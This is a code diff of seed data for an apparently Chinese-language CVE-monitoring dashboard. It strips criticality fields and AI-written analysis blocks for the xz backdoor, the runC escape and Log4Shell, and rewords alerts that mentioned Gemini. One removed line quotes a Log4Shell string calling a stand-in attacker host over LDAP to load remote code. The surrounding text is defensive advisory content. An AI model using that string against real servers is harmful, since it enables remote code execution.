@@ -151,7 +151,6 @@ export const INITIAL_PRODUCTS: MonitoredProduct[] = [
     vendor: 'Linux',
     category: 'Operating System',
     cpeKeyword: 'linux_kernel',
-    criticality: 'CRITICAL',
     autoScanEnabled: true,
     scanIntervalMinutes: 15,
     lastScannedAt: new Date(Date.now() - 5 * 60000).toISOString(),
@@ -170,7 +169,6 @@ export const INITIAL_PRODUCTS: MonitoredProduct[] = [
     vendor: 'OpenSSL Project',
     category: 'Framework/Library',
     cpeKeyword: 'openssl',
-    criticality: 'CRITICAL',
     autoScanEnabled: true,
     scanIntervalMinutes: 15,
     lastScannedAt: new Date(Date.now() - 12 * 60000).toISOString(),
@@ -189,7 +187,6 @@ export const INITIAL_PRODUCTS: MonitoredProduct[] = [
     vendor: 'CNCF',
     category: 'Container/Cloud',
     cpeKeyword: 'kubernetes',
-    criticality: 'HIGH',
     autoScanEnabled: true,
     scanIntervalMinutes: 30,
     lastScannedAt: new Date(Date.now() - 25 * 60000).toISOString(),
@@ -208,7 +205,6 @@ export const INITIAL_PRODUCTS: MonitoredProduct[] = [
     vendor: 'Apache',
     category: 'Framework/Library',
     cpeKeyword: 'log4j',
-    criticality: 'CRITICAL',
     autoScanEnabled: true,
     scanIntervalMinutes: 60,
     lastScannedAt: new Date(Date.now() - 40 * 60000).toISOString(),
@@ -227,7 +223,6 @@ export const INITIAL_PRODUCTS: MonitoredProduct[] = [
     vendor: 'F5 NGINX',
     category: 'Web Server',
     cpeKeyword: 'nginx',
-    criticality: 'HIGH',
     autoScanEnabled: true,
     scanIntervalMinutes: 30,
     lastScannedAt: new Date(Date.now() - 18 * 60000).toISOString(),
@@ -246,7 +241,6 @@ export const INITIAL_PRODUCTS: MonitoredProduct[] = [
     vendor: 'PostgreSQL Global Development Group',
     category: 'Database',
     cpeKeyword: 'postgresql',
-    criticality: 'HIGH',
     autoScanEnabled: true,
     scanIntervalMinutes: 60,
     lastScannedAt: new Date(Date.now() - 50 * 60000).toISOString(),
@@ -265,7 +259,6 @@ export const INITIAL_PRODUCTS: MonitoredProduct[] = [
     vendor: 'Docker Inc.',
     category: 'Container/Cloud',
     cpeKeyword: 'docker_engine',
-    criticality: 'CRITICAL',
     autoScanEnabled: true,
     scanIntervalMinutes: 15,
     lastScannedAt: new Date(Date.now() - 8 * 60000).toISOString(),
@@ -284,7 +277,6 @@ export const INITIAL_PRODUCTS: MonitoredProduct[] = [
     vendor: 'Automattic',
     category: 'Application',
     cpeKeyword: 'wordpress',
-    criticality: 'MEDIUM',
     autoScanEnabled: false,
     scanIntervalMinutes: 120,
     lastScannedAt: new Date(Date.now() - 180 * 60000).toISOString(),
@@ -330,20 +322,7 @@ export const INITIAL_CVES: CVEItem[] = [
       { name: 'NIST NVD Advisory', url: 'https://nvd.nist.gov/vuln/detail/CVE-2024-3094' },
       { name: 'CISA KEV Alert', url: 'https://www.cisa.gov/known-exploited-vulnerabilities-catalog' },
       { name: 'Red Hat Security Advisory', url: 'https://access.redhat.com/security/cve/cve-2024-3094' }
-    ],
-    aiAnalysis: {
-      summary: '這是嚴重的供應鏈植入後門事件。攻擊者在 liblzma 的構建腳本中隱蔽植入二進位碼，篡改 OpenSSH 伺服器的 RSA 金鑰驗證過程，繞過身分驗證直接獲得 Root 遠端執行權限。',
-      impactLevel: 'CRITICAL',
-      attackScenario: '未經授權的外部攻擊者可向暴露於網際網路的 SSH 服務發送精心設計的特製金鑰，直接獲取該主機最高 Root 權限。',
-      mitigationSteps: [
-        '立即將 XZ Utils 降級至安全穩定版（如 5.4.6）。',
-        '檢查伺服器系統內是否裝有 XZ 5.6.0 / 5.6.1 並比對二進位雜湊值。',
-        '全面核查 SSH 登入日誌與連線紀錄是否出現異常 IP 的存取。'
-      ],
-      workaround: '若無法立即更新降級，可暫時禁止外網存取 SSH 埠，或禁用 SSH 的 Public Key 身分驗證。',
-      executiveAdvisory: '此漏洞影響部分滾動更新 Linux 發行版（例如 Fedora Rawhide, Debian Unstable, Arch Linux）。建議資安營運團隊（SOC）列為最高緊急事件，即刻盤點全企業 Linux 主機之套件版本。',
-      analyzedAt: new Date(Date.now() - 30 * 60000).toISOString()
-    }
+    ]
   },
   {
     id: 'CVE-2024-21626',
@@ -374,20 +353,7 @@ export const INITIAL_CVES: CVEItem[] = [
     references: [
       { name: 'NVD CVE-2024-21626', url: 'https://nvd.nist.gov/vuln/detail/CVE-2024-21626' },
       { name: 'Docker Security Advisory', url: 'https://docs.docker.com/engine/release-notes/25.0/#2502' }
-    ],
-    aiAnalysis: {
-      summary: '容器執行階段 runC 存在工作目錄檔案描述符洩漏漏洞。攻擊者可藉由在容器內執行工作目錄指向 /proc/self/fd/ 的特製指令，突破容器隔離寫入宿主機檔案系統。',
-      impactLevel: 'HIGH',
-      attackScenario: '惡意使用者部署包含特殊 Dockerfile 屬性的映像檔或執行 docker exec，進而獲取宿主主機（Host OS）檔案讀寫能力與權限提升。',
-      mitigationSteps: [
-        '將 runC 升級至 1.1.12 或更高版本。',
-        '將 Docker Engine 升級至 25.0.2 / 24.0.9 或更新版。',
-        '在 Kubernetes 集群限制未經審核的不信任容器映像檔部署。'
-      ],
-      workaround: '避免在 Docker 容器內部掛載未信任的特權卷或將主機根目錄映射給容器。',
-      executiveAdvisory: '雲原生與 Docker / Kubernetes 集群維運團隊必須立即升級 Worker 節點的 runC 元件，以防範跨容器越權攻擊。',
-      analyzedAt: new Date(Date.now() - 120 * 60000).toISOString()
-    }
+    ]
   },
   {
     id: 'CVE-2021-44228',
@@ -418,19 +384,7 @@ export const INITIAL_CVES: CVEItem[] = [
     references: [
       { name: 'NVD Log4Shell Advisory', url: 'https://nvd.nist.gov/vuln/detail/CVE-2021-44228' },
       { name: 'Apache Log4j Security Guide', url: 'https://logging.apache.org/log4j/2.x/security.html' }
-    ],
-    aiAnalysis: {
-      summary: '全球知名的 Log4Shell 漏洞。Log4j2 預設開啟 JNDI Lookup 功能，攻擊者僅需在 HTTP Header 或輸入欄位傳送 JNDI 語法，即可引導系統遠端下載並執行惡意 Java Class 檔。',
-      impactLevel: 'CRITICAL',
-      attackScenario: '未授權攻擊者傳送包含 ${jndi:ldap://evil.com/a} 字串，伺服器解析日誌時觸發外聯請求並執行任意二進位碼。',
-      mitigationSteps: [
-        '升級 Log4j 至 2.17.1 以上版本（移除 JNDI 功能）。',
-        '於 Java 啟動參數中設定 -Dlog4j2.formatMsgNoLookups=true（若無法升級）。',
-        '防火牆/WAF 阻斷外聯 LDAP, RMI, DNS 異常連線。'
-      ],
-      executiveAdvisory: '儘管已發布多年，仍常被自動化勒索軟體掃描利用，請確保企業 Java 專案無殘留舊版 Log4j JAR 包。',
-      analyzedAt: new Date(Date.now() - 240 * 60000).toISOString()
-    }
+    ]
   },
   {
     id: 'CVE-2023-0286',
@@ -592,7 +546,7 @@ export const INITIAL_NOTIFICATIONS: AlertNotification[] = [
     cvssScore: 10.0,
     severity: 'CRITICAL',
     cisaKev: true,
-    message: '重大警報: Log4j 監控到 CVSS 10.0 遠端程式碼執行漏洞，系統自動調用 Gemini AI 生成修補步驟。',
+    message: '重大警報: Log4j 監控到 CVSS 10.0 遠端程式碼執行漏洞，請儘速依官方公告完成修補。',
     ruleName: 'Critical Security Threat Alert (CVSS >= 9.0)',
     status: 'ACKNOWLEDGED',
     timestamp: new Date(Date.now() - 180 * 60000).toISOString(),
@@ -663,8 +617,7 @@ export const INITIAL_TICKETS: Ticket[] = [
     ],
     slaHours: 24,
     slaDeadline: new Date(Date.now() + 20 * 3600000).toISOString(),
-    aiModelUsed: 'gemini-3.6-flash',
-    executiveSummary: '本專案綁定之「Linux Kernel」與「OpenSSL」經 AI 評估發現包含 CVE-2024-3094 (CVSS 10.0，已被 CISA 列入 KEV) 等重大威脅。攻擊者可利用後門繞過 SSH 身份驗證，取得金流伺服器最高存取權限。必須於 24 小時內完成版號升級與重構驗證。',
+    executiveSummary: '本專案綁定之「Linux Kernel」與「OpenSSL」經系統彙整發現包含 CVE-2024-3094 (CVSS 10.0，已被 CISA 列入 KEV) 等重大威脅。攻擊者可利用後門繞過 SSH 身份驗證，取得金流伺服器最高存取權限。必須於 24 小時內完成版號升級與重構驗證。',
     rootCauseAnalysis: '因作業系統底層系統庫 liblzma/xz-utils 於建置階段被植入惡意混淆代碼，導致 SSHd 服務載入該 shared library 時掛鉤 RSA 解密邏輯，進而造成非授權遠端程式碼執行。',
     actionSteps: [
       {
@@ -723,7 +676,6 @@ export const INITIAL_TICKETS: Ticket[] = [
     ],
     slaHours: 72,
     slaDeadline: new Date(Date.now() + 48 * 3600000).toISOString(),
-    aiModelUsed: 'gemini-3.6-flash',
     executiveSummary: 'K8s 叢集 Worker Node 上的 runC 存在工作目錄 file descriptor 洩漏瑕疵。攻擊者若於 Pod 內建立惡意的 WORKDIR 指向 `/proc/self/fd/`，可在容器啟動時突破隔離層並寫入 Node 宿主機根檔案系統。',
     rootCauseAnalysis: 'runc exec 或 runc create 期間，process 在套用 cgroup 與 pivot_root 前未關閉內部系統 FD，致使子處理程序保留了宿主機目錄 FD 控制權。',
     actionSteps: [
@@ -785,10 +737,10 @@ export const INITIAL_LOGS: ScanLog[] = [
   {
     id: 'log-4',
     timestamp: new Date(Date.now() - 60000).toISOString(),
-    type: 'AI_ANALYSIS',
+    type: 'SYSTEM_INFO',
     level: 'SUCCESS',
     productName: 'XZ Utils / Linux Kernel',
-    message: 'Gemini AI 完成 CVE-2024-3094 智慧風險分析與防範建議',
+    message: '已完成 CVE-2024-3094 漏洞資料更新與風險摘要整理',
     details: '模型: gemini-3.6-flash, 耗時: 1.2s',
   }
 ];
